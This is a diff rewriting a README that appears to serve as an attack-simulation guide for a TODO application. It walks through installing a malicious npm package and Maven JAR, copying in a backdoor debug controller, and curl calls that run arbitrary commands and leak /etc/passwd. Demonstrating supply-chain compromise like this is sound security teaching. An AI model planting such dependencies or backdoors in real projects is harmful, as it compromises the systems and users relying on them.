@@ -1,9 +1,23 @@
-# Supply Chain Attack Simulation
 
-This directory contains intentionally malicious packages used to demonstrate how a
-project could be infected with dependencies that appear legitimate.
+# Attack Simulation Guide
 
-## evil-package (Node.js)
+This directory contains intentionally malicious code used to demonstrate several
+ways an attacker could compromise the TODO application.
+
+## Attack Scenarios
+
+1. **Malicious npm package injection** – infect the React client by installing
+   the locally built `evil-package`.
+2. **Malicious Maven library injection** – add the `evil-lib` JAR to the Spring
+   Boot backend.
+3. **Remote shell backdoor** – copy a debug controller that executes arbitrary
+   commands.
+4. **Password leak endpoint** – the same controller exposes an endpoint that
+   returns `/etc/passwd`.
+
+---
+
+### 1. Malicious npm package injection
 
 1. Build the package:
    ```bash
@@ -17,10 +31,10 @@ project could be infected with dependencies that appear legitimate.
    cd ../../todo-client
    npm install ../malicious/evil-package/evil-package-1.0.0.tgz
    ```
-   The `package.json` does not include this dependency by default; installing the
-   archive adds it to `package-lock.json` for a more realistic compromise.
+   The archive is added to `package-lock.json`, mimicking a compromised
+   dependency tree.
 
-## evil-lib (Maven)
+### 2. Malicious Maven library injection
 
 1. Build and install the library to the local Maven repository:
    ```bash
@@ -39,10 +53,10 @@ project could be infected with dependencies that appear legitimate.
        -Dfile=../malicious/evil-lib/target/evil-lib-1.0.0.jar
    # Then update pom.xml to reference com.malicious:evil-lib:1.0.0
    ```
-  The manual step mimics an attacker injecting the dependency after the build
-  has started.
+   The manual step mimics an attacker injecting the dependency after the build
+   has started.
 
-## Malicious Debug Controller
+### 3. Remote shell backdoor
 
 1. Copy the malicious controller into the API:
    ```bash
@@ -52,18 +66,22 @@ project could be infected with dependencies that appear legitimate.
    cd ..
    ```
 
-2. Rebuild the application so the new endpoints are active:
+2. Rebuild the application so the new endpoint is active:
    ```bash
    cd ../todo-api
    ./mvnw package -DskipTests
    ```
 
-3. Use the remote shell:
+3. Execute arbitrary commands:
    ```bash
    curl "http://<todo-api-service>/debug-shell?cmd=whoami"
    ```
 
-4. Leak `/etc/passwd` contents:
-   ```bash
-   curl "http://<todo-api-service>/leak"
-   ```
+### 4. Password leak endpoint
+
+With the debug controller installed, this call exfiltrates the host's
+`/etc/passwd` file:
+
+```bash
+curl "http://<todo-api-service>/leak"
+```
